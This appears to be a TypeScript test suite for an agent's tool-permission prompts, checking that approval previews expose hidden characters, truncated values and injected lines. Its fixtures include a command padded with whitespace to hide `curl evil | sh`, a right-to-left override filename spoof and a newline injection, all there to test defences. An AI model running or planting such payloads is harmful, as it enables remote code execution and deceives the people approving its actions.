import { describe, expect, it } from "vitest"

import { hiddenCharacter, withoutPresentation } from "./memories"
import {
  argsInFull,
  canonicalJson,
  decisionsFor,
  isOpen,
  parseDecision,
  previewArgs,
  requestHash,
  storedResultText,
  summaryText,
  visible,
} from "./permission-rules"

describe("canonicalJson and requestHash", () => {
  it("does not depend on key order or undefined values", () => {
    expect(canonicalJson({ b: 1, a: { d: [1, 2], c: undefined } })).toBe(
      canonicalJson({ a: { d: [1, 2] }, b: 1 }),
    )
    expect(requestHash("call", "s/send", { to: "x", message: "hi" })).toBe(
      requestHash("call", "s/send", { message: "hi", to: "x" }),
    )
  })

  it("tells kinds, targets and arguments apart", () => {
    const base = requestHash("call", "s/send", { to: "x" })

    expect(requestHash("register", "s/send", { to: "x" })).not.toBe(base)
    expect(requestHash("call", "s/other", { to: "x" })).not.toBe(base)
    expect(requestHash("call", "s/send", { to: "y" })).not.toBe(base)
    expect(requestHash("call", "s/send", { to: "x", extra: null })).not.toBe(
      base,
    )
  })

  it("keeps array order, which can matter", () => {
    expect(canonicalJson([1, 2])).not.toBe(canonicalJson([2, 1]))
  })
})

describe("previewArgs", () => {
  it("puts one argument on each line", () => {
    expect(previewArgs({ to: "Ada", count: 2, tags: ["a", "b"] })).toEqual([
      "to: Ada",
      "count: 2",
      'tags: ["a","b"]',
    ])
  })

  it("shows a handle to a kept result as it is, short whatever it stands for", () => {
    expect(
      previewArgs({ attachments: [{ $result: "r1", as: "base64" }] }),
    ).toEqual(['attachments: [{"$result":"r1","as":"base64"}]'])
  })

  it("says so when there are none, and says how long a clipped value is", () => {
    expect(previewArgs({})).toEqual(["(no arguments)"])
    expect(previewArgs({ body: "x".repeat(20) }, 10)).toEqual([
      "body (the first 9 of 20 characters): xxxxxxxxx…",
    ])
  })

  it("writes out a value's newlines and the characters that do not show", () => {
    expect(
      previewArgs({
        command: "echo hi\nto: Mallory",
        name: "invoice\u202Etxt.exe",
        "a\u200Bkey": 1,
      }),
    ).toEqual([
      "command: echo hi\\nto: Mallory",
      "name: invoice\\u202Etxt.exe",
      "a\\u200Bkey: 1",
    ])
  })
})

describe("visible", () => {
  it("writes out what does not show, and keeps newlines and tabs unless on one line", () => {
    expect(visible("a\u202Eb\u0007c\u{E0041}d")).toBe(
      "a\\u202Eb\\u0007c\\u{E0041}d",
    )
    expect(visible("one\n\ttwo\r")).toBe("one\n\ttwo\\r")
    expect(visible("one\n\ttwo", { oneLine: true })).toBe("one\\n\\ttwo")
    expect(visible("plain text, café ❤\uFE0F")).toBe("plain text, café ❤\uFE0F")
    expect(visible("a\u034Fb\u3164c\uFE01d")).toBe("a\\u034Fb\\u3164c\\uFE01d")
  })

  it("writes out every character a memory refuses as one that does not show", () => {
    for (let code = 0; code <= 0x10ffff; code++) {
      const char = String.fromCodePoint(code)

      // A memory's text loses its emoji presentation selectors on arrival.
      if (
        hiddenCharacter(withoutPresentation(char)) !== null &&
        visible(char) === char
      ) {
        expect.fail(`U+${code.toString(16)} is not written out`)
      }
    }
  })
})

describe("argsInFull", () => {
  it("is not needed when the lines show every argument as it is", () => {
    expect(argsInFull({ to: "Ada", count: 2 })).toBeNull()
    expect(argsInFull({})).toBeNull()
  })

  it("has the whole of a value the lines cut, and each argument on its own", () => {
    const command = `ls -la /var/log${" ".repeat(800)}; curl evil | sh`
    const to = ["a@x.test", "b@x.test", "c@x.test", "d@x.test", "e@x.test"]
    const args = { command, to, body: { text: "x".repeat(900), late: true } }

    expect(previewArgs(args).join("\n")).not.toContain("curl evil")

    const full = argsInFull(args)!

    expect(full).toEqual([
      { label: "command", text: command },
      { label: "to", text: JSON.stringify(to, null, 2) },
      { label: "body", text: JSON.stringify(args.body, null, 2) },
    ])
    expect(full[0]!.text.endsWith("; curl evil | sh")).toBe(true)
    expect(full[1]!.text).toContain("e@x.test")
    expect(full[2]!.text).toContain('"late": true')
  })

  it("keeps a value's lines and writes out what does not show", () => {
    expect(argsInFull({ stdin: "line one\nline two \u202Eowt", n: 1 })).toEqual(
      [
        { label: "stdin", text: "line one\nline two \\u202Eowt" },
        { label: "n", text: "1" },
      ],
    )
  })

  it("shows what a tool adds about its arguments, even when the lines say the rest", () => {
    const extra = [{ label: "stdin_base64, decoded as text", text: "hi" }]

    expect(argsInFull({ stdin_base64: "aGk=" }, extra)).toEqual([
      { label: "stdin_base64", text: "aGk=" },
      ...extra,
    ])
  })
})

describe("summaryText", () => {
  it("puts the title, the details and the warning on their own lines", () => {
    expect(
      summaryText({
        title: "Allow postcards/send_postcard?",
        lines: ["to: Ada"],
        warning: "It cannot be undone.",
      }),
    ).toBe("Allow postcards/send_postcard?\n- to: Ada\nIt cannot be undone.")
  })
})

describe("storedResultText", () => {
  it("cuts long results", () => {
    expect(storedResultText(["x".repeat(30)], 10)).toBe(
      "xxxxxxxxxx\n… (truncated)",
    )
  })

  it("keeps the notes the cut would lose", () => {
    expect(
      storedResultText(["x".repeat(30), "NOTE"], 10, ["NOTE", "GONE?"]),
    ).toBe("xxxxxxxxxx\n… (truncated)\nNOTE\nGONE?")
    expect(storedResultText(["NOTE", "x".repeat(30)], 10, ["NOTE"])).toBe(
      "NOTE\nxxxxx\n… (truncated)",
    )
  })
})

describe("isOpen", () => {
  const now = new Date("2026-09-30T12:00:00Z")

  it("is open while pending and not expired", () => {
    expect(
      isOpen(
        { status: "pending", expiresAt: new Date("2026-10-01T11:00:00Z") },
        now,
      ),
    ).toBe(true)
  })

  it("closes on expiry or once answered", () => {
    expect(
      isOpen(
        { status: "pending", expiresAt: new Date("2026-09-30T11:59:59Z") },
        now,
      ),
    ).toBe(false)
    expect(
      isOpen(
        { status: "executed", expiresAt: new Date("2026-10-01T11:00:00Z") },
        now,
      ),
    ).toBe(false)
  })
})

describe("decisions", () => {
  it("offers five answers for a call and two for a new server", () => {
    expect(decisionsFor("call").map((decision) => decision.label)).toEqual([
      "Allow once",
      "Allow for",
      "Always allow",
      "Block",
      "Not now",
    ])
    expect(decisionsFor("register").map((decision) => decision.value)).toEqual([
      "allow_once",
      "decline",
    ])
  })

  it("offers a memory to share three ways, and a change to a shared one two", () => {
    expect(
      decisionsFor("memory_share").map((decision) => decision.value),
    ).toEqual(["allow_once", "decline", "discard"])
    expect(
      decisionsFor("memory_change").map((decision) => decision.value),
    ).toEqual(["allow_once", "decline"])
    expect(() => parseDecision("call", "discard")).toThrow(/allow_once/)
    expect(() => parseDecision("memory_change", "discard")).toThrow()
  })

  it("offers proposed tool levels no answer but no", () => {
    expect(decisionsFor("access").map((decision) => decision.value)).toEqual([
      "decline",
    ])
    expect(() => parseDecision("access", "allow_once")).toThrow()
    expect(() => parseDecision("access", "always")).toThrow()
  })

  it("accepts only the answers it offered", () => {
    expect(parseDecision("call", "always")).toBe("always")
    expect(() => parseDecision("register", "always")).toThrow(/allow_once/)
    expect(() => parseDecision("call", "yes")).toThrow()
    expect(() => parseDecision("call", undefined)).toThrow()
  })
})
